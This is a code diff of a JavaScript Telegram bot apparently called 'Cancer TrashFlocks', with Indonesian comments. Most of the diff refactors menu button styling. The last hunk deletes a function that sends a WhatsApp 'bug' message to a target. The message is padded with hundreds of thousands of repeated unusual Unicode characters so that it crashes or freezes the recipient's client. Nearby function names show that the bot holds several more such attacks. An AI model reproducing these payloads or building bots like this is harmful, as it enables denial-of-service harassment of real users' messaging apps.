@@ -455,30 +455,49 @@ const btnUtama = {
     }
 };
 
+// Shared style index untuk semua button (sama persis seperti btnUtama)
+const btnStyler = {
+    styleIndex: 0,
+    get() {
+        const style = styles[this.styleIndex];
+        this.styleIndex = (this.styleIndex + 1) % styles.length;
+        return style;
+    }
+};
+
 const btnKembali = {
-    inline_keyboard: [
-        [{ text: "BACK TO START", callback_data: "back_start" }]
-    ]
+    get inline_keyboard() {
+        const style = btnStyler.get();
+        return [
+            [{ text: "BACK TO START", callback_data: "back_start", style: style }]
+        ];
+    }
 };
 
 const btnNavigasi1 = {
-    inline_keyboard: [
-        [
-            { text: "1 / 2", callback_data: "none" },
-            { text: "NEXT >>", callback_data: "fitur_pg2", style: style, icon_custom_emoji_id: "5465198330558557107" }
-        ],
-        [{ text: "KEMBALI", callback_data: "back_start", style: style, icon_custom_emoji_id: "5465465194056525619" }]
-    ]
+    get inline_keyboard() {
+        const style = btnStyler.get();
+        return [
+            [
+                { text: "1 / 2", callback_data: "none", style: style },
+                { text: "NEXT >>", callback_data: "fitur_pg2", style: style, icon_custom_emoji_id: "5465198330558557107" }
+            ],
+            [{ text: "KEMBALI", callback_data: "back_start", style: style, icon_custom_emoji_id: "5465465194056525619" }]
+        ];
+    }
 };
 
 const btnNavigasi2 = {
-    inline_keyboard: [
-        [
-            { text: "<< BACK", callback_data: "fitur_pg1" },
-            { text: "2 / 2", callback_data: "none" }
-        ],
-        [{ text: "KEMBALI", callback_data: "back_start", style: style, icon_custom_emoji_id: "5462990652943904884" }]
-    ]
+    get inline_keyboard() {
+        const style = btnStyler.get();
+        return [
+            [
+                { text: "<< BACK", callback_data: "fitur_pg1", style: style },
+                { text: "2 / 2", callback_data: "none", style: style }
+            ],
+            [{ text: "KEMBALI", callback_data: "back_start", style: style, icon_custom_emoji_id: "5462990652943904884" }]
+        ];
+    }
 };
 
 // ==========================================
@@ -613,7 +632,7 @@ bot.start(async (ctx) => {
             `<b><tg-emoji emoji-id="5215327832040811010">⏳</tg-emoji> Runtime : ${runtime}</b>\n\n` +
             `<code>Cancer TrashFlocks</code>`;
 
-        const button = [[{ text: "「 ♱ 」Open Menu", callback_data: "back", style: style, icon_custom_emoji_id: "5463274047771000031" }]];
+        const button = [[{ text: "「 ♱ 」Open Menu", callback_data: "back", style: btnStyler.get(), icon_custom_emoji_id: "5463274047771000031" }]];
 
         await ctx.replyWithPhoto(thumbnailurl, {
             caption: menuMessage,
@@ -824,13 +843,13 @@ bot.action("back", async (ctx) => {
             `<b><tg-emoji emoji-id="5215327832040811010">⏳</tg-emoji> Runtime : ${runtime}</b>\n\n` +
             `<code>Cancer TrashFlocks</code>`;
         const button = [
-            [{ text: "「 ♱ 」Trash Feture", callback_data: "trashshow", style: style, icon_custom_emoji_id: "5465225015190367274" }],
+            [{ text: "「 ♱ 」Trash Feture", callback_data: "trashshow", style: btnStyler.get(), icon_custom_emoji_id: "5465225015190367274" }],
             [
-                { text: "「 ♱ 」Settings", callback_data: "settings", style: style, icon_custom_emoji_id: "5463412289883353404" },
-                { text: "「 ♱ 」Tools", callback_data: "toolsmenu", style: style, icon_custom_emoji_id: "5465137208878969279" }
+                { text: "「 ♱ 」Settings", callback_data: "settings", style: btnStyler.get(), icon_custom_emoji_id: "5463412289883353404" },
+                { text: "「 ♱ 」Tools", callback_data: "toolsmenu", style: btnStyler.get(), icon_custom_emoji_id: "5465137208878969279" }
             ],
-            [{ text: "「 ♱ 」Thanks To", callback_data: "thanksto", style: style, icon_custom_emoji_id: "5463054218459884779" }],
-            [{ text: "「 ♱ 」Creator", url: "https://t.me/xnnxdxc", style: style, icon_custom_emoji_id: "5463274047771000031" }]
+            [{ text: "「 ♱ 」Thanks To", callback_data: "thanksto", style: btnStyler.get(), icon_custom_emoji_id: "5463054218459884779" }],
+            [{ text: "「 ♱ 」Creator", url: "https://t.me/xnnxdxc", style: btnStyler.get(), icon_custom_emoji_id: "5463274047771000031" }]
         ];
         await ctx.editMessageMedia(
             {
@@ -3240,39 +3259,6 @@ async function VnXDelayXfrezeeNew(sock, target) {
     );
   }
   await sleep(5000);
-}
-
-async function VnXBlankQoutedNew(sock, target) {
- await sock.relayMessage(target, {
-  viewOnceMessage: {
-     message: {
-      newsletterAdminInviteMessage: {
-        newsletterJid: "123456789@newsletter",
-        inviteCode: "𑜦𑜠".repeat(120000),
-        inviteExpiration: 99999999999,
-        newsletterName: "ោ៝" + "ꦾ".repeat(250000),
-        contextInfo: {
-         isForwarded: true,
-         forwardingScore: 999,
-        quotedMessage: {
-         groupInviteMessage: {
-           groupJid: "1@g.us",
-           inviteCode: "ꦽ".repeat(5000),
-           inviteExpiration: "99999999999",
-           groupName: "༑ ▾ DxC ▾ ༑" + "ꦾ".repeat(25000),
-           caption: " x " + "ꦾ".repeat(5000),
-           body: {
-            text: "DxC Is Here" + "ી".repeat(250000)
-            }
-          }
-        }
-      }
-    }
-  }
- }
-}, { participant: { jid: target } });
-
-  console.log("[!] DxC Bug Sent to: " + target);
 }
 
 async function VnXDelayNewByRaffi(sock, target) {
